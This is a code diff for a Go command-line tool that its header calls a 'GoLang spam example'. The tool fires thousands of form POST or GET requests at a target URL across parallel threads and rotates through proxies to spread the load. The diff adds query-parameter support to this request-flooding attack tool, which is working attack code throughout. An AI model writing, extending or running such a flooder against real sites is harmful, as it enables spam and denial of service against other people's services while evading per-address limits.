@@ -1,7 +1,7 @@
 /**
 	* hope it helps u 							 *
 	* By Nikita Vtorushin <n.vtorushin@inbox.ru> *
-	* @https://t.me/nvtorushin 					 *
+	* https://t.me/nvtorushin 					 *
 	* GoLang spam example OSINT      			 *
 **/
 
@@ -32,16 +32,25 @@ func main() {
 	method := flag.String("method", "POST", "method for attack (POST/GET)")
 	count := flag.Int("count", 10000, "count for attack")
 	data := flag.String("data", ``, "data for attack")
-	proxyFile := flag.String("proxyfile", "", "file containing proxies (one per line)")
+	query := flag.String("query", ``, "query parameters for attack")
+	proxyFile := flag.String("proxy", "", "file containing proxies (one per line)")
 	threads := flag.Int("threads", 1, "number of threads for attack")
 	flag.Parse()
 
 	var requestData url.Values
+	var queryData url.Values
 
 	if *attackUrl != "" {
 
-		if *data != "" {
-			requestData = getData(*method, *data)
+		if *method == "POST" || *method == "post" {
+			if *data != "" {
+				requestData = getData(*method, *data)
+			}
+			if *query != "" {
+				queryData = getData("GET", *query)
+			}
+		} else if (*method == "GET" || *method == "get") && *query != "" {
+			requestData = getData(*method, *query)
 		}
 
 		var proxies []string
@@ -56,7 +65,7 @@ func main() {
 		wg.Add(*threads)
 
 		for i := 1; i <= *threads; i++ {
-			go runAttacks(*attackUrl, *method, requestData, proxies, totalRequests, i, &wg)
+			go runAttacks(*attackUrl, *method, requestData, queryData, proxies, totalRequests, i, &wg)
 		}
 
 		wg.Wait()
@@ -67,26 +76,22 @@ func main() {
 	}
 }
 
-func runAttacks(attackUrl string, method string, data url.Values, proxies []string, count int, threadIndex int, wg *sync.WaitGroup) {
+func runAttacks(attackUrl string, method string, data url.Values, queryData url.Values, proxies []string, count int, threadIndex int, wg *sync.WaitGroup) {
 	defer wg.Done()
 
 	for i := 0; i < count; i++ {
 		if i%5 == 0 {
 			fmt.Println("Thread", threadIndex, "Good:", completeCount, "Bad:", errorCount)
 		}
-		startAttack(attackUrl, method, data, proxies, threadIndex)
+		startAttack(attackUrl, method, data, queryData, proxies, threadIndex)
 	}
 }
 
-func startAttack(attackUrl string, method string, data url.Values, proxies []string, threadIndex int) {
+func startAttack(attackUrl string, method string, data url.Values, queryData url.Values, proxies []string, threadIndex int) {
 	client := &http.Client{}
 
-	// Проверяем наличие прокси перед использованием
 	if len(proxies) > 0 {
-		// Выбираем прокси циклически, основываясь на уникальном индексе потока
 		proxyIndex := (threadIndex - 1) % len(proxies)
-
-		// Добавляем поддержку прокси, если указано
 		proxy := proxies[proxyIndex]
 		if proxy != "" {
 			proxyUrl, err := url.Parse(proxy)
@@ -99,8 +104,23 @@ func startAttack(attackUrl string, method string, data url.Values, proxies []str
 		}
 	}
 
-	resp, err := client.PostForm(attackUrl, data)
+	var resp *http.Response
+	var err error
 
+	if method == "POST" || method == "post" {
+		if len(queryData) > 0 {
+			attackUrl += "?" + queryData.Encode()
+		}
+		resp, err = client.PostForm(attackUrl, data)
+	} else if method == "GET" || method == "get" {
+		if len(data) > 0 {
+			attackUrl += "?" + data.Encode()
+		}
+		resp, err = client.Get(attackUrl)
+	} else {
+		fmt.Println("Invalid method:", method)
+		return
+	}
 	if err != nil {
 		fmt.Println("Site not available:", attackUrl, "\nERROR:", err)
 		errorCount++
@@ -129,13 +149,23 @@ func log(data any) {
 }
 
 func getData(method string, data string) url.Values {
-	log(method)
 	if method == "POST" || method == "post" {
 		var body = []byte(data)
 		return getFormatPostData(body)
+	} else if method == "GET" || method == "get" {
+		return getFormatGetData(data)
 	} else {
 		return nil
 	}
+}
+
+func getFormatGetData(data string) url.Values {
+	parsedData, err := url.ParseQuery(data)
+	if err != nil {
+		fmt.Println("Error parsing query parameters:", err)
+		return nil
+	}
+	return parsedData
 }
 
 func getFormatPostData(body []byte) url.Values {
@@ -174,5 +204,3 @@ func readProxiesFromFile(file string) []string {
 
 	return proxies
 }
-
-func getFormatGetData() {}
